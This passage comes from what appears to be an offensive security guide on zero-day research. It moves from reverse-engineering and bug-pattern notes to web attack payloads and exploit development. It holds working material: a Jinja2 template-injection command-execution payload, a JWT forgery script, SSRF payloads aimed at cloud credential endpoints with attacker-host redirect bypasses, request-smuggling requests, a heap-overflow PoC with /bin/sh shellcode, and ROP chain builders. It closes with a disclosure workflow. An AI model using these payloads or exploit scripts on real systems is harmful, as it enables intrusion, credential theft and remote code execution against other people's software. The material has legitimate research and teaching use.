        const dest = args[0];
        const src = args[1];
        const count = args[2].toInt();
        console.log(`memcpy(dest=${dest}, src=${src}, count=${count})`);
        
        // Check if dest buffer is large enough
        if (count > 1024) {
            console.log("Large copy detected!");
            console.log(Thread.backtrace(this.context, Backtracer.ACCURATE)
                .map(DebugSymbol.fromAddress).join('\n'));
        }
    }
});

// Run: frida -p <pid> -l hook.js
// Run: frida vulnerable_binary -l hook.js
```

#### x64dbg (Windows)

```
1. Load target binary
   File → Open → Select executable
   
2. Set breakpoints on security functions
   Ctrl+G → memcpy, strcpy, sprintf, HeapAlloc, VirtualProtect
   
3. Run and trigger
   F9 → Interact with the target
   
4. Analyze crash
   View → Call Stack (Alt+K)
   View → Handles (Alt+H)
   View → Memory Map (Alt+M)
   
5. Taint analysis
   Trace user-controlled bytes through execution
   Use: String references to find where input enters
```

#### GDB (Linux)

```bash
# GDB with peda/pwndbg for exploit development
gdb -q ./vulnerable_program

# PEDA commands
peda pattern create 2000          # Generate cyclic pattern
peda pattern offset $rsp          # Find offset to crash
checksec                          # Check security mitigations
vmmap                             # Memory layout
searchmem "/bin/sh"               # Find strings in memory
elfsymbols                        # List symbols
find "/bin/sh"                    # Search for gadgets
```

### Identifying Vulnerability Classes During RE

#### Buffer Overflows

Look for these patterns in decompiler output:

```c
// Pattern 1: strcpy with unknown source length
void process_input(char *user_input) {
    char buffer[256];
    strcpy(buffer, user_input);  // No length check
    // strcpy doesn't exist in modern code; look for:
    // memcpy, memmove, sprintf, gets, read() without bound
}

// Pattern 2: sprintf with user data
void format_log(char *user) {
    char log_entry[512];
    sprintf(log_entry, "User: %s - Action: %s", user, action);
    // If user input exceeds 512 bytes → overflow
}

// Pattern 3: Read without proper size check
void read_packet(int fd) {
    char buf[1024];
    int n = read(fd, buf, sizeof(buf));  // OK
    // But what if:
    int n = read(fd, buf, 4096);         // Read larger than buffer!
}

// Pattern 4: Off-by-one
void parse_header(char *data, int len) {
    char header[64];
    for (int i = 0; i <= len; i++) {     // <= instead of <
        header[i] = data[i];
    }
    // Last byte writes one past buffer
}
```

**Static analysis indicators:**

| Decompiler Pattern | Bug Class | Confidence |
|-------------------|-----------|------------|
| `strcpy(dst, src)` | Classic overflow | High |
| `memcpy(dst, src, count)` where count > dst size | Overflow | Medium |
| `sprintf(dst, "%s", src)` | Overflow | High |
| `for(i=0; i<=len; i++)` | Off-by-one | Medium |
| `int len = user_controlled; char buf[len];` | Stack variable | Low |
| `while(*src) { *dst++ = *src++; }` | No bound check | High |

#### Use-After-Free

Track object lifecycle in decompiler output:

```c
// Pattern 1: Free then use through another reference
void process() {
    obj_t *obj = malloc(sizeof(obj_t));
    obj->data = user_input;
    do_something(obj);
    free(obj);
    // Later in execution:
    another_function(obj);  // obj was freed but reference still exists
    obj->data = new_data;   // Writing to freed memory
}

// Pattern 2: Double free
void cleanup() {
    if (obj->refcount == 0) {
        free(obj->data);
        free(obj);          // First free
    }
    // If refcount logic is wrong, this runs again:
    free(obj);              // Second free → crash or exploit
}

// Pattern 3: Use after realloc
void resize(int new_size) {
    obj->data = realloc(obj->data, new_size);
    // After realloc, old pointer is invalid
    // BUT: if realloc fails, obj->data is still the old pointer
    if (!obj->data) {
        // Error: old data is still accessible
    }
}
```

**Tracking object lifecycle during RE:**
1. Identify `malloc`/`calloc`/`realloc` calls
2. Track the returned pointer through the data flow
3. Mark every `free` call on that pointer
4. Check if any path exists that uses the pointer after a `free`
5. Check if any path exists that frees the pointer more than once

#### Integer Overflows

```c
// Pattern 1: Multiplication overflow
void allocate_array(int count, int elem_size) {
    int total = count * elem_size;     // Overflow before malloc!
    void *buf = malloc(total);
    // If count=0x10000 and elem_size=0x10000:
    // total = 0x100000000 → truncated to 0x00000000
    // malloc(0) → returns small buffer
    // memcpy(buf, data, count * elem_size) → massive overflow
}

// Pattern 2: Addition overflow
void read_packet_header(int payload_len) {
    int total = payload_len + sizeof(header);  // Addition overflow
    char *buf = malloc(total);
    read(fd, buf, payload_len + sizeof(header));  // Actual size
    // If payload_len = 0xFFFFFFFF:
    // total = 0xFFFFFFFF + sizeof(header) → small number
    // read() tries to read 0xFFFFFFFF + sizeof(header) → heap overflow
}

// Pattern 3: Signed/unsigned confusion
int read_packet_size() {
    int size = read_int_from_network();  // Read as signed int
    if (size > 0 && size < MAX_SIZE) {
        char *buf = malloc(size);        // size could be negative!
        read(fd, buf, size);             // Cast to size_t → huge positive
    }
}
```

**Integer overflow red flags in decompiler output:**

| Pattern | Description |
|---------|-------------|
| `a * b` where a,b are user-controlled | Multiplication overflow |
| `a + b` where a,b sum to > 2^31 | Addition overflow |
| `(int)value` → later used as `size_t` | Signed/unsigned confusion |
| `a - b` where b > a | Underflow leading to large allocation |
| `a << b` where b is large | Shift overflow |
| `++counter` where counter wraps | Counter overflow leading to logic bug |

#### Format String Bugs

```c
// Pattern: printf with user input as format string
void log_message(char *user_input) {
    char buffer[1024];
    snprintf(buffer, sizeof(buffer), user_input);  // FORMAT STRING BUG!
    // Should be: snprintf(buffer, sizeof(buffer), "%s", user_input)
}

// Dangerous patterns to find:
printf(user_input);                     // Direct format string
fprintf(logfile, user_input);           // Format string to file
syslog(LOG_INFO, user_input);           // Format string to syslog
snprintf(buf, size, user_input);        // Format string to buffer
```

**What to exploit with format string:**
- Read stack values (`%x`, `%p`, `%n$x`)
- Read arbitrary memory (`%s` with address on stack)
- Write to arbitrary address (`%n`)
- Overwrite GOT entries, `__malloc_hook`, `__free_hook`

#### Logic Bugs in State Machines

```c
// Pattern: State machine with missing transition check
typedef enum {
    STATE_INIT,
    STATE_AUTHENTICATED,
    STATE_READY,
    STATE_PROCESSING,
    STATE_ERROR
} connection_state_t;

void process_command(connection_t *conn, command_t *cmd) {
    switch (conn->state) {
        case STATE_INIT:
            if (cmd->type == CMD_AUTH) {
                authenticate(conn, cmd);
                conn->state = STATE_AUTHENTICATED;
            }
            // Missing: what if cmd->type == CMD_EXEC?
            // Would execute before authentication!
            break;
            
        case STATE_AUTHENTICATED:
            if (cmd->type == CMD_READY) {
                conn->state = STATE_READY;
            }
            break;
            
        case STATE_READY:
            // Can execute commands
            execute(conn, cmd);
            break;
    }
}
```

**State machine RE methodology:**
1. Identify the state variable (enum, integer, or struct field)
2. Map all transitions: `(current_state, event) → next_state`
3. Identify any `(state, event)` pair that's NOT handled
4. Check if that missing pair leads to a security bypass

### Network Protocol RE for Proprietary Protocols

```python
#!/usr/bin/env python3
# Step 1: Capture traffic
# Use Wireshark, tcpdump, or mitmproxy

# Step 2: Identify message structure
def analyze_protocol(pcap_file):
    """Basic protocol structure analysis."""
    from scapy.all import rdpcap, TCP
    
    packets = rdpcap(pcap_file)
    sessions = {}
    
    for pkt in packets:
        if TCP in pkt and pkt[TCP].payload:
            # Group by TCP stream
            stream_id = (pkt[IP].src, pkt[TCP].sport, 
                        pkt[IP].dst, pkt[TCP].dport)
            if stream_id not in sessions:
                sessions[stream_id] = b""
            sessions[stream_id] += bytes(pkt[TCP].payload)
    
    # Step 3: Look for patterns
    for session_id, data in sessions.items():
        print(f"Session {session_id}: {len(data)} bytes")
        
        # Find message boundaries
        if data[:4] == b'\x00\x00\x00':
            # Possible big-endian length prefix
            msg_len = int.from_bytes(data[:4], 'big')
            print(f"  Length prefix: {msg_len}")
        
        # Look for magic bytes
        if data[:2] in [b'\xff\xfb', b'\xfe\xfd']:
            print("  SSL/TLS handshake detected")
        
        # Look for plaintext markers
        markers = [b'GET', b'POST', b'HTTP', b'<?xml', b'{', b'[', b'<']
        for marker in markers:
            if marker in data[:100]:
                print(f"  Marker found: {marker}")
```

**Protocol RE checklist:**
1. Capture at least 1000 messages
2. Identify fixed vs variable fields
3. Map field sizes and offsets
4. Identify checksum/CRC fields
5. Identify length fields and their scope
6. Find magic bytes or protocol identifiers
7. Determine endianness
8. Check for encryption/compression

### Mobile App RE

#### APK Extraction and Analysis

```bash
# Step 1: Get the APK
# From device:
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-xxx/base.apk

# From Play Store:
# Use: apkeep, APKDownloader, or manual extraction

# Step 2: Decompile with jadx
jadx -d output_dir base.apk
# Optionally: jadx-gui base.apk (GUI interface)

# Step 3: Convert to DEX and analyze
d2j-dex2jar base.apk -o output.jar
# Then open in JD-GUI or analyze with procyon

# Step 4: Decompile resources and manifest
apktool d base.apk -o apk_unpacked

# Step 5: Extract native libraries
unzip -l base.apk | grep "\.so$"
# Analyze with Ghidra/IDA

# Step 6: Hardcoded secret discovery
grep -rn "api_key\|secret\|password\|token\|jwt\|bearer" output_dir/
grep -rn "https\?://" output_dir/ --include="*.java" --include="*.xml"
```

#### iOS IPA Analysis

```bash
# Step 1: Decrypt IPA (if App Store)
# Requires jailbroken device or frida-ios-dump
frida-ios-dump com.target.app

# Step 2: Extract Mach-O binaries
unzip Target.ipa -d ipa_extracted/
cd ipa_extracted/Payload/*.app

# Step 3: Analyze with class-dump
class-dump TargetBinary > headers.txt
# Look for: ObjC method names revealing auth logic

# Step 4: Analyze with Hopper/Ghidra
# Load the binary from Payload/*.app/TargetBinary

# Step 5: Analyze with Frida (on jailbroken device)
frida -U com.target.app -l ios_hook.js
```

#### Frida for Mobile App Dymanic Analysis

```javascript
// Android: intercept HTTP requests
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    
    // Hook build() to see all outgoing requests
    OkHttpClient.newCall.overload('okhttp3.Request').implementation = 
        function(request) {
        console.log("Request to: " + request.url().toString());
        console.log("Headers: " + request.headers().toString());
        return this.newCall(request);
    };
});

// iOS: intercept NSURLSession
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    var NSURLRequest = ObjC.classes.NSURLRequest;
    
    Interceptor.attach(NSURLSession['- dataTaskWithRequest:completionHandler:'].implementation, {
        onEnter: function(args) {
            var request = ObjC.Object(args[2]);
            console.log("Request URL: " + request.URL().absoluteString());
            console.log("Headers: " + request.allHTTPHeaderFields());
        }
    });
}
```

### IoT Firmware Extraction and Analysis

```bash
# Step 1: Identify firmware image
file firmware.bin
binwalk firmware.bin

# Step 2: Extract filesystem
# Common patterns: squashfs, jffs2, cpio, cramfs
binwalk -Me firmware.bin

# Step 3: Analyze filesystem
cd _firmware.bin.extracted/

# Find web servers, CGI scripts
find . -name "*.cgi" -o -name "*.asp" -o -name "lighttpd*" -o -name "nginx*"
find . -name "*.conf" | xargs grep -l "auth\|password\|secret"

# Find hardcoded credentials
grep -r "admin\|root\|password\|passwd" etc/ --include="*.conf" --include="*.txt"
grep -r "telnet\|ssh\|httpd" etc/init.d/ etc/inittab

# Step 4: Extract and analyze binaries
find . -name "lib*.so" -o -name "*.bin" -o -executable -type f | head -20
# Analyze each with Ghidra/IDA

# Step 5: Emulate with QEMU
# User-mode emulation
qemu-arm -L extracted_fs ./bin/httpd

# Full system emulation
qemu-system-arm -M versatilepb -kernel vmlinuz -initrd initrd.img \
    -drive file=squashfs.img,format=raw
```

---

## Web 0-Day Patterns

### Template Injection Discovered Through Error Analysis

**Pattern:** Template engines that include user input in error messages, revealing engine type and version.

```python
# Flask/Jinja2 error message:
TemplateSyntaxError: Expected 'endfor', got '}'
  File "/usr/lib/python3/dist-packages/jinja2/environment.py", line 430

# This reveals:
# - Python 3.x environment
# - Jinja2 template engine
# - Exact Jinja2 path → version determination

# Exploitation vector from this:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Detection probes for template engines:**

| Probe | Expected Result (if vulnerable) |
|-------|--------------------------------|
| `{{7*7}}` | `49` in response |
| `${7*7}` | `49` in response |
| `#{7*7}` | `49` in response |
| `*{7*7}` | `49` in response |
| `<%= 7*7 %>` | `49` in response |
| `{{config}}` | Reveals Flask app config |
| `{{''.__class__.__mro__}}` | Object class hierarchy |
| `${7*'7'}` | `7777777` (Freemarker) |
| `{{7*'7'}}` | `49` (Jinja2 treats * as numeric) |

### Mass Assignment Leading to Privilege Escalation

**Pattern:** Object-relational mapping (ORM) frameworks that auto-bind request body fields to model attributes.

```
Vulnerable endpoint:
PUT /api/user/profile
Body: {"name": "New Name"}

The ORM does:
  User.find(params[:id]).update(params)
  # params = {"name" => "New Name", "role" => "admin"}
  # If "role" is in params, it updates role too!

What to send for 0-day discovery:
PUT /api/user/profile
Body: {"name": "New Name", "$where": "1==1", "role": "admin"}

OR:
PUT /api/user/profile
Body: {"name": "New Name", "constructor": {"prototype": {"isAdmin": true}}}
```

**Mass assignment 0-day discovery workflow:**
1. Catalog every field in every API request
2. Try adding every security-related field: `role`, `is_admin`, `type`, `scope`, `level`
3. Try nested object injection: `{"user": {"role": "admin"}}`
4. Try prototype pollution through JSON parsers
5. Try MongoDB-specific: `{"$set": {"role": "admin"}}`

### JWT Algorithm Confusion

**Pattern Progression:**
1. `alg: none` — Classic (no signature check)
2. `alg: HS256` with weak key — Brute-force the HMAC secret
3. `alg: RS256` using public key as HMAC secret — Confusion attack
4. `alg: RS256` + `jku` header — JWK Set URL injection
5. `alg: RS256` + `jwk` header — Inline JWK injection
6. `kid` header injection — Path traversal to arbitrary file as key
7. `x5u` header — X.509 URL injection
8. `x5c` header — Embedded certificate manipulation

```python
# JWT confusion attack: RS256 → HS256 with public key
import jwt
import requests

# Step 1: Get the server's public key (often at /jwks.json, /pubkey.pem)
pub_key = requests.get("https://target.com/.well-known/jwks.json").text

# Step 2: Forge token using public key as HMAC secret
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin", "iat": 1234567890},
    pub_key,
    algorithm="HS256"
)

# Step 3: Test the forged token
response = requests.get(
    "https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(response.text)  # If 200 → admin access achieved
```

### Prototype Pollution to RCE Chains

**Pattern:** JavaScript object merge operations that recursively assign properties without checking for inherited properties.

```javascript
// Vulnerable pattern (found in lodash.merge, jQuery.extend, Object.assign)
function merge(target, source) {
    for (var key in source) {
        if (isObject(source[key])) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    // No check: if key === "__proto__" or "constructor"
}

// Exploitation
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
console.log({}.polluted);  // true — prototype is polluted

// RCE chain: pollute prototype → affect application behavior
// Pollute: Object.prototype.shell = "id"
// Wait for application code to do:
//   eval(someObject.shell)
// Or:
//   require(someObject.path)
// Or:
//   exec(someObject.command)
```

**Prototype pollution gadget discovery:**

| Gadget Path | Condition | Result |
|-------------|-----------|--------|
| `Object.prototype.command` → `child_process.exec` | Server uses `_.defaultsDeep` with user data | RCE |
| `Object.prototype.src` → `script.src` | Client-side template renders user data | XSS |
| `Object.prototype.transport` → `socket.io` | Server uses polluted transport config | SSRF |
| `Object.prototype.path` → `require.resolve` | Module loading with polluted path | RCE |
| `Object.prototype.type` → response `Content-Type` | Server generates response with polluted type | XSS |

### Server-Side Request Forgery to Cloud Metadata

**Pattern:** Application fetches URLs provided by user input without proper validation of the target.

```
Discovery:
  Any endpoint that accepts a URL:
  - Profile picture URL fetch
  - Webhook callback URL
  - PDF generator (URL as input)
  - RSS/Atom feed reader
  - URL shortener
  - Link preview generator

SSRF to cloud metadata:
  AWS:   http://169.254.169.254/latest/meta-data/
         http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP:   http://metadata.google.internal/computeMetadata/v1/
         http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
         http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**SSRF bypass techniques for 0-day discovery:**

| Technique | Payload | When It Works |
|-----------|---------|---------------|
| IPv6 loopback | `http://[::1]:80/` | Server has IPv6 stack |
| DNS rebinding | `http://rebind.example.com` | Server resolves DNS twice |
| Shortened URL | `http://bit.ly/xxx` | Only checks original URL |
| Redirect | `http://attacker.com/redirect?to=169.254.169.254` | Follows 3xx redirects |
| Decimal IP | `http://2886795266/` | Parser accepts decimal IP format |
| IPv4 octal | `http://0251.0376.0251.0376/` | Parser interprets octal |
| URL parser confusion | `http://169.254.169.254:80@evil.com/` | Parser reads `@` differently |
| Unicode normalization | `http://①⑨⑨.①⑦⑧.①②④.①④④/` | Parser normalizes unicode digits |
| A record to internal | `http://internal.target.com/` | DNS resolves to internal IP |
| HTTP redirect to internal | `http://evil.com/redirect-to-metadata` | Redirect chain to internal IP |
| IPv4 to hex | `http://0xA9FEA9FE/` | Parser accepts hex IP notation |

### Cache Poisoning/Deception Novel Variants

**Pattern:** Exploiting differences between how the cache key is computed and how the application processes the request.

```
Standard cache poison:
  Request:  GET /page?param=normal HTTP/1.1
            X-Forwarded-Host: attacker.com
  Response: <link href="https://attacker.com/style.css">
  
  Cache key: /page?param=normal (X-Forwarded-Host excluded)
  → Poisoned response served to everyone

Novel variant — Unkeyed query parameters:
  Request:  GET /page?cachebuster=1&host=attacker.com HTTP/1.1
  Response: Contains data from host query parameter
  
  Cache key: /page?cachebuster=1 (host parameter not in vary)
  → All users see attacker-controlled content
```

**Unkeyed parameter discovery workflow:**

1. Find a page that reflects user input
2. Add random query parameters one at a time
3. Check if the parameter affects the response
4. Check if the parameter is in the Vary header or cache key
5. If parameter affects response but NOT in cache key → cache poison 0-day

### HTTP Request Smuggling Variant Discovery

**Pattern:** Front-end and back-end servers disagree on message boundaries.

```
CL.TE smuggling:
  Front-end uses Content-Length
  Back-end uses Transfer-Encoding

  Smuggled request:
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 44
  Transfer-Encoding: chunked

  0

  GET /admin HTTP/1.1
  X-Ignore: X
  
  Front-end sees: content length 44 (the full message)
  Back-end sees: chunked encoding (0 = end), then GET /admin as next request
```

**Testing for novel smuggling variants:**

| Variant | Front-End | Back-End | Detection |
|---------|-----------|----------|-----------|
| CL.TE | CL | TE | Send CL + TE, smuggle next request |
| TE.CL | TE | CL | Send TE + CL, smuggle in chunk body |
| TE.TE | TE (lenient) | TE (strict) | Send obfuscated TE header |
| H2.CL | HTTP/2 | HTTP/1.1 | Upgrade, inject CL header |
| H2.TE | HTTP/2 | HTTP/1.1 | Upgrade, inject TE header |

**CL.0 (novel variant):** Back-end ignores Content-Length entirely.

```
POST /smuggle HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

→ Front-end reads Content-Length: 5 (sends "0\r\n\r\nG")
→ Back-end reads until connection closes
→ Back-end sees: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
→ Processes GET /admin as a new request
```

---

## Exploit Development

### Exploit Primitive Identification

An exploit primitive is a building block that can be combined to achieve a goal.

| Primitive | Description | Goal |
|-----------|-------------|------|
| Arbitrary read | Read memory at controlled address | Leak secrets, bypass ASLR |
| Arbitrary write | Write controlled value to controlled address | Overwrite function pointer |
| Relative read | Read at offset from controlled pointer | Leak heap structures |
| Relative write | Write at offset from controlled pointer | Corrupt adjacent objects |
| Stack pivot | Move stack pointer to controlled buffer | Execute ROP chain |
| Info leak | Leak address of key structures | Bypass ASLR |
| Type confusion | Treat object as different type | Read/write arbitrary memory |

**From crash to primitive:**

```
Crash: Access violation reading address 0x41414141
        → We control a pointer
        → We have: arbitrary read (if we can dereference it)
        → We need: control over what's at 0x41414141

Crash: Access violation writing 0xdeadbeef to address 0x41414141
        → We control the value AND the target address
        → We have: full arbitrary write
        → Next: what can we overwrite?

Crash: RIP = 0x4141414141414141
        → We control the instruction pointer
        → We have: code execution primitive
        → Need: where to jump (ROP chain, shellcode address)
```

### Writing Reliable PoCs

A PoC must be reproducible, deterministic, and demonstrate impact.

```python
#!/usr/bin/env python3
"""
0-Day PoC for CVE-2026-XXXX
Target: Product X version Y.Z
Type: Heap buffer overflow leading to RCE
Author: researcher@example.com
"""

import socket
import struct
import sys

def build_payload():
    """Build the exploit payload."""
    # Step 1: Overflow the heap buffer
    overflow_size = 0x1000
    overflow_data = b"A" * overflow_size
    
    # Step 2: Overwrite heap metadata
    fake_chunk = struct.pack("<Q", 0xDEADBEEF)  # fake size
    fake_chunk += struct.pack("<Q", 0x41414141)  # fake fd pointer
    
    # Step 3: Overwrite function pointer
    target_addr = 0x7ffff7dd3780  # __free_hook
    shellcode_addr = 0x7ffff7ddd000  # address of our shellcode
    
    # Step 4: Shellcode (execve("/bin/sh", NULL, NULL))
    shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0"
    shellcode += b"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    shellcode += b"\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
    
    # Assemble the payload
    payload = overflow_data
    payload += fake_chunk
    payload += struct.pack("<Q", target_addr)  # Overwrite target
    payload += struct.pack("<Q", shellcode_addr)  # Shellcode address
    payload += shellcode
    
    return payload

def exploit(host, port):
    """Send the exploit payload."""
    payload = build_payload()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        print(f"[*] Connected to {host}:{port}")
        
        # Step 1: Send trigger packet
        packet = struct.pack(">I", len(payload))  # Length prefix
        packet += payload
        sock.send(packet)
        print("[*] Payload sent")
        
        # Step 2: Receive shell
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                print(data.decode(errors='replace'))
            except:
                break
                
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)
    exploit(sys.argv[1], int(sys.argv[2]))
```

### Dealing with ASLR/DEP/SEHOP

#### ASLR Bypass

```
Technique: Info leak + rebase calculation
  Need: 1 info leak of any module address
  Then: offset = leaked_addr - module_base
  Then: all addresses = module_base + offset

Common info leak sources:
  - Heap pointer leak in response
  - Stack leak through format string
  - Uninitialized memory in response
  - Type confusion revealing object address
  - Side channel timing differences
```

#### DEP Bypass

```
Technique: Return-Oriented Programming (ROP)
  Need: Gadgets to:
  1. Set memory as executable (VirtualProtect, mprotect, or HeapCreate)
  2. Write shellcode to executable memory
  3. Execute shellcode

Basic ROP chain:
  pop rcx; ret         ← rcx = address to make executable
  pop rdx; ret         ← rdx = size
  pop r8; ret          ← r8 = PAGE_EXECUTE_READWRITE (0x40)
  mov rax, rcx; ret    ← rax = address
  push VirtualProtect; ret  ← call VirtualProtect
  push shellcode_addr; ret ← jump to shellcode
```

#### SEHOP Bypass

```
Technique: Overwrite SEH handler while maintaining chain integrity
  Windows Vista+ has SEHOP (Structured Exception Handler Overwrite Protection)
  
  Bypass methods:
  1. Target non-SEH exception handlers (vectored exception handlers)
  2. Use a handler address that has a valid SEH chain pointer
  3. Corrupt the SEH chain validation pointer
  4. Target /GS cookie instead
```

### Browser Exploit Chain Components

```
Modern browser exploit chain (Chrome/Firefox):

┌─────────────────────────────────────────────────┐
│ Step 1: Initial Access                          │
│   └─ Renderer RCE (JS engine or DOM bug)        │
│      └─ Shellcode executes in sandboxed renderer │
└─────────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────┐
│ Step 2: Sandbox Escape                           │
│   └─ Browser process IPC bug                     │
│   └─ Mojo/Chromium IPC serialization error       │
│   └─ Shared memory corruption                    │
└─────────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────┐
│ Step 3: System Persistence / Privilege Escalation │
│   └─ Child process spawning                      │
│   └─ System call abuse                           │
│   └─ SUID binary exploitation                    │
└─────────────────────────────────────────────────┘
```

**Real-world exploit components:**

| Component | Bug Class | Example |
|-----------|-----------|---------|
| Renderer | JIT compiler bug (wrong type assumption) | CVE-2024-3159, CVE-2023-3079 |
| Renderer | JS engine OOB access | CVE-2023-4863 (WebP RCE) |
| Sandbox | Mojo IPC deserialization | CVE-2023-5217 |
| Sandbox | File system access bypass | CVE-2024-0222 |
| Persistence | Chrome update privilege escalation | CVE-2023-4357 |

### ROP Chain Construction Basics

```python
#!/usr/bin/env python3
"""
Basic ROP chain builder.
Requires: ROPgadget output of target binary.
"""

def build_rop_chain(gadgets, target_func, args):
    """
    Build a ROP chain to call target_func with given args.
    
    gadgets: dict of {gadget_name: (address, instructions)}
    target_func: address of function to call
    args: list of arguments
    """
    chain = []
    
    # x64 calling convention: rcx, rdx, r8, r9, stack
    
    # Find gadgets
    pop_rcx = find_gadget(gadgets, "pop rcx; ret")
    pop_rdx = find_gadget(gadgets, "pop rdx; ret")
    pop_r8  = find_gadget(gadgets, "pop r8; ret")
    pop_r9  = find_gadget(gadgets, "pop r9; ret")
    
    if len(args) >= 1:
        chain += [pop_rcx, args[0]]
    if len(args) >= 2:
        chain += [pop_rdx, args[1]]
    if len(args) >= 3:
        chain += [pop_r8, args[2]]
    if len(args) >= 4:
        chain += [pop_r9, args[3]]
    
    # Remaining args on stack
    for arg in args[4:]:
        chain += [arg]
    
    # Jump to target function
    chain += [target_func]
    
    return chain


def find_gadget(gadgets, pattern):
    """Find gadget by instruction pattern."""
    for addr, instrs in gadgets.items():
        if pattern in instrs:
            return addr
    raise Exception(f"Gadget not found: {pattern}")


# Common gadget patterns to search for:
GADGET_PATTERNS = {
    "pop rcx; ret":         r"\x59\xc3",
    "pop rdx; ret":         r"\x5a\xc3",
    "pop r8; ret":          r"\x41\x58\xc3",
    "pop r9; ret":          r"\x41\x59\xc3",
    "pop rax; ret":         r"\x58\xc3",
    "pop rdi; ret":         r"\x5f\xc3",
    "pop rsi; ret":         r"\x5e\xc3",
    "pop rsp; ret":         r"\x5c\xc3",
    "mov rax, rcx; ret":    r"\x48\x89\xc8\xc3",
    "xor rax, rax; ret":    r"\x48\x31\xc0\xc3",
    "inc rax; ret":         r"\x48\xff\xc0\xc3",
    "syscall; ret":         r"\x0f\x05\xc3",
    "jmp rax":              r"\xff\xe0",
}
```

### One-Day Exploit Adaptation from Patch Diff

```
Timeline:
  T+0h:  Vendor releases patch + advisory (CVE-2026-XXXX)
  T+1h:  Patch downloaded, binary diff begins
  T+2h:  Vulnerable function identified
  T+4h:  Root cause understood, crash reproduced
  T+8h:  Exploit primitive identified
  T+16h: Working PoC against unpatched version
  T+24h: Reliable exploit (bypasses mitigations)

Accelerated workflow:
  Don't analyze every change. Ask:
  1. "What data flow did this fix change?" — Find the input/output path
  2. "What assumption did the old code make?" — Find the developer error
  3. "How can I trigger the old path?" — Find the unpatched surface
  4. "What's the closest primitive?" — Find the easiest exploitation path
```

### Metasploit Module Development

```ruby
# Metasploit auxiliary module template
class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
    
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Product X 0-Day Scanner',
            'Description'    => 'Detects CVE-2026-XXXX vulnerability',
            'Author'         => ['researcher'],
            'References'     => [
                ['CVE', '2026-XXXX'],
                ['URL', 'https://example.com/advisory']
            ],
            'DisclosureDate' => '2026-06-16'
        ))
        
        register_options([
            Opt::RPORT(443),
            OptString.new('TARGETURI', [true, 'Path to vulnerable endpoint', '/'])
        ])
    end
    
    def check
        # Step 1: Probe the target
        res = send_request_cgi({
            'uri'    => normalize_uri(target_uri.path, 'vulnerable_endpoint'),
            'method' => 'POST',
            'data'   => vulnerable_payload
        })
        
        return Exploit::CheckCode::Unknown unless res
        
        # Step 2: Detect vulnerability signature
        if res.code == 500 && res.body.include?('SEGFAULT')
            return Exploit::CheckCode::Vulnerable
        end
        
        Exploit::CheckCode::Safe
    end
    
    def run
        if check == Exploit::CheckCode::Vulnerable
            print_good("Target is vulnerable to CVE-2026-XXXX")
        else
            print_warning("Target appears patched")
        end
    end
end
```

### GHDB and Searchsploit Integration

```bash
# Searchsploit for historical bugs in the same product
searchsploit "product name"
searchsploit "vendor" webapps
searchsploit -t remote | grep "product"

# Google Hacking Database (GHDB) integration
# Patterns to search for 0-day vectors:
#   intitle:"product X" inurl:"path"
#   filetype:php product_x
#   inurl:"?page=" "product_x"
#   "powered by product X" "error"
#   "product X version" warning
```

---

## Responsible Disclosure

### Vendor Contact Workflow

```
Step 1: Identify the correct channel
  - Security email: security@company.com, psirt@company.com
  - Bug bounty platform: HackerOne, Bugcrowd, company VDP
  - GitHub: Open a security advisory (private)
  - Vendor website security page

Step 2: Initial contact (Day 0)
  Subject: [Security] Vulnerability in Product X Y.Z
  Body: Brief description, impact, and request for encrypted communication

  Include:
  - Your public PGP key or reference to security.txt
  - Suggested embargo period (typically 90 days)
  - Brief statement: "I've found a vulnerability in Product X Y.Z"

Step 3: Full disclosure (Day 1-7)
  After receiving acknowledgment, send:
  - Full technical description
  - Working PoC or steps to reproduce
  - Impact analysis (CVSS score with vector)
  - Suggested fix (if known)
  - Proof of concept without weaponization (if preferred)

Step 4: Collaboration (Day 7-90)
  - Answer vendor questions
  - Provide clarifications
  - Test the vendor's fix
  - Coordinate advisory publication

Step 5: Publication (Day 90+)
  - CVE publication
  - Coordinated advisory release
  - Blog post / presentation (if desired)
```

### CVE Request Process

```
Two CVE assignment authorities commonly used:

MITRE (cve.mitre.org / cveform.mitre.org)
  - Free and open
  - Takes 2-7 days for response
  - Required fields: Product, version, vulnerability type, description, discoverer
  - Not required: Fix, exploitation details

CVE Program through DWF/NVD
  - Some vendors can CVE-number their own bugs
  - Check if vendor is CVE Numbering Authority (CNA)
  - If vendor is not a CNA, use MITRE form

Information needed for CVE request:
  - Product name and version
  - Vulnerability type (CWE)
  - Affected component
  - Impact description
  - Attack vector
  - Discoverer name/handle
  - References (advisory URL, commit hash, PoC)
```

### Disclosure Timelines

| Timeline | Description | When To Use |
|----------|-------------|-------------|
